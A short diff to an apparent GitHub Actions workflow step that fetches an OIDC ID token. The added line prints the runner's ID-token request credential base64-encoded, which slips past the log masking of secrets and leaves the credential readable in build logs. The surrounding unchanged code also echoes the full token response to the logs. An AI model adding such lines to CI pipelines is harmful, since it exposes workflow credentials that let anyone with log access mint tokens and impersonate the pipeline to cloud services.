@@ -21,6 +21,7 @@ jobs:
     steps:
       - name: Get ID Token
         run: |
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | base64
           TOKEN_JSON=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUDIENCE")
           echo "$TOKEN_JSON"
           ID_TOKEN=$(echo "$TOKEN_JSON" | jq -r .value)
